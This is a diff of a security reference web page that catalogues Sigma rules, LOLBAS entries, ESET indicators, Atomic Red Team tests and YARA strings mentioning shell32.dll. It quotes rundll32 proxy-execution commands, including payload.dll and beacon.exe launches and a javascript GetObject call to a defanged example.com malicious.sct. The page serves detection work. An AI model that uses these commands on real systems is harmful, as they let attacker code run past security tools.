@@ -2723,87 +2723,123 @@
   <tbody>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#  runs %SystemRoot%\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/security/win_invoke_obfuscation_via_rundll_services_security.yml">win_invoke_obfuscation_via_rundll_services_security.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">shell32.dll'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_control_dll_load.yml">win_susp_control_dll_load.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">CommandLine: '*Shell32.dll*'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/security/win_invoke_obfuscation_via_use_rundll32_services_security.yml">win_invoke_obfuscation_via_use_rundll32_services_security.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">shell32.dll'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_activity.yml">win_susp_rundll32_activity.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\rundll32.exe* Shell32.dll,*Control_RunDLL *'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_impacket_lateralization.yml">proc_creation_win_impacket_lateralization.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#  runs %SystemRoot%\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_activity.yml">win_susp_rundll32_activity.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '* Shell32.dll,*Control_RunDLL *'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_outlook_shell.yml">proc_creation_win_outlook_shell.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#    - 'shell32.dll,Control_RunDLL'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_control_dll_load.yml">proc_creation_win_susp_control_dll_load.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">CommandLine\|contains</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Shell32.dll'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_activity.yml">proc_creation_win_susp_rundll32_activity.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">shell32.dll'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml">proc_creation_win_susp_target_location_shell32.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">title</span><span class="pi">:</span> <span class="s">Shell32 DLL Execution in Suspicious Directory</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml">proc_creation_win_susp_target_location_shell32.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">Detects shell32.dll executing a DLL in a suspicious directory</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml">proc_creation_win_susp_target_location_shell32.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">shell32.dll'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Name: Shell32.dll</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Name</span><span class="pi">:</span> <span class="s">Shell32.dll</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32.exe shell32.dll,Control_RunDLL payload.dll</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32.exe shell32.dll,Control_RunDLL payload.dll</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: c:\windows\system32\shell32.dll</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">c:\windows\system32\shell32.dll</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
       <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: c:\windows\syswow64\shell32.dll</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">c:\windows\syswow64\shell32.dll</span></code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml">Shell32.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Link</span><span class="pi">:</span> <span class="s">https://windows10dll.nirsoft.net/shell32_dll.html</span></code></td>
       <td> </td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json">misp-dukes-operation-ghost-event.json</a></td>
-      <td><code class="language-plaintext highlighter-rouge">"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"&lt;/code&gt;  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"description"</span><span class="err">:</span> <span class="s">"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:\"</span><span class="err">\\..\\</span><span class="ni">mshtml</span><span class="p">,</span><span class="ni">RunHTMLApplication</span> <span class="err">\</span><span class="s">";document.write();GetObject(\"</span><span class="kd">script:</span><span class="ni">https</span><span class="err">[:]</span><span class="p">//</span><span class="ni">www</span><span class="err">[.]</span><span class="ni">example</span><span class="err">[.]</span><span class="ni">com</span><span class="p">/</span><span class="ni">malicious</span><span class="err">.</span><span class="ni">sct</span><span class="err">\</span><span class="s">")\"</span><span class="err">&lt;</span><span class="p">/</span><span class="ni">code</span><span class="err">&gt;</span>  <span class="ni">This</span> <span class="ni">behavior</span> <span class="ni">has</span> <span class="ni">been</span> <span class="ni">seen</span> <span class="ni">used</span> <span class="ni">by</span> <span class="ni">malware</span> <span class="ni">such</span> <span class="ni">as</span> <span class="ni">Poweliks</span><span class="err">.</span> <span class="p">(</span><span class="ni">Citation</span><span class="err">:</span> <span class="ni">This</span> <span class="ni">is</span> <span class="ni">Security</span> <span class="ni">Command</span> <span class="ni">Line</span> <span class="ni">Confusion</span><span class="p">)</span><span class="err">"</span><span class="p">,</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json">misp_invisimole.json</a></td>
-      <td><code class="language-plaintext highlighter-rouge">"description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"&lt;/code&gt;  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"description"</span><span class="err">:</span> <span class="s">"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:\"</span><span class="err">\\..\\</span><span class="ni">mshtml</span><span class="p">,</span><span class="ni">RunHTMLApplication</span> <span class="err">\</span><span class="s">";document.write();GetObject(\"</span><span class="kd">script:</span><span class="ni">https</span><span class="err">[:]</span><span class="p">//</span><span class="ni">www</span><span class="err">[.]</span><span class="ni">example</span><span class="err">[.]</span><span class="ni">com</span><span class="p">/</span><span class="ni">malicious</span><span class="err">.</span><span class="ni">sct</span><span class="err">\</span><span class="s">")\"</span><span class="err">&lt;</span><span class="p">/</span><span class="ni">code</span><span class="err">&gt;</span>  <span class="ni">This</span> <span class="ni">behavior</span> <span class="ni">has</span> <span class="ni">been</span> <span class="ni">seen</span> <span class="ni">used</span> <span class="ni">by</span> <span class="ni">malware</span> <span class="ni">such</span> <span class="ni">as</span> <span class="ni">Poweliks</span><span class="err">.</span> <span class="p">(</span><span class="ni">Citation</span><span class="err">:</span> <span class="ni">This</span> <span class="ni">is</span> <span class="ni">Security</span> <span class="ni">Command</span> <span class="ni">Line</span> <span class="ni">Confusion</span><span class="p">)</span><span class="err">"</span><span class="p">,</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/README.adoc">invisimole</a></td>
-      <td><code class="language-plaintext highlighter-rouge">"FlashConfigEnrollee" = "shell32 ShellExec_RunDLL  "C:\Windows\SysWOW64\drivers\Rundll32.exe" "C:\Windows\SysWOW64\drivers\wdigest.dll",SpInitialize %SHELLCODE_BYTES%"</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/sigma/win_apt_invisimole_sminit_chain.yml">win_apt_invisimole_sminit_chain.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">rundll32.exe</span><span class="nv"> </span><span class="s">shell32.dll,ShellExec_RundDLL'</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md">T1218.010.md</a></td>
-      <td>| dll_file | Path to renamed dll file to be registered | Path | %temp%\shell32.jpg|</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/sigma/win_apt_invisimole_wdigest_chain.yml">win_apt_invisimole_wdigest_chain.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">CommandLine\|contains</span><span class="pi">:</span> <span class="s1">'</span><span class="s">rundll32.exe</span><span class="nv"> </span><span class="s">Shell32.dll</span><span class="nv"> </span><span class="s">ShellExec_RunDLL</span><span class="nv"> </span><span class="s">cmd.exe</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">mkdir</span><span class="nv"> </span><span class="s">SMRTNTKY\MessageB.txt'</span></code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
@@ -2815,6 +2851,12 @@
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md">T1218.011.md</a></td>
       <td>Rundll32.exe can also be used to execute <a href="https://attack.mitre.org/techniques/T1218/002">Control Panel</a> Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md">T1218.011.md</a></td>
+      <td>rundll32.exe shell32.dll,Control_RunDLL #{input_file}</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
     <tr>
@@ -2861,6 +2903,12 @@
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/crime_icedid.yar">crime_icedid.yar</a></td>
+      <td>$string7 = “SHELL32.dll” fullword</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
       <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_uac_elevators.yar">exploit_uac_elevators.yar</a></td>
       <td>$s6 = “shell32.dll” wide</td>
       <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
@@ -2874,7 +2922,7 @@
   </tbody>
 </table>
 
-<p>MIT License. Copyright (c) 2020 Strontic.</p>
+<p>MIT License. Copyright (c) 2020-2021 Strontic.</p>
 
 
     </section>
@@ -2945,7 +2993,7 @@
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2021 STRONTIC. Theme: <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2022 STRONTIC. Theme: <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
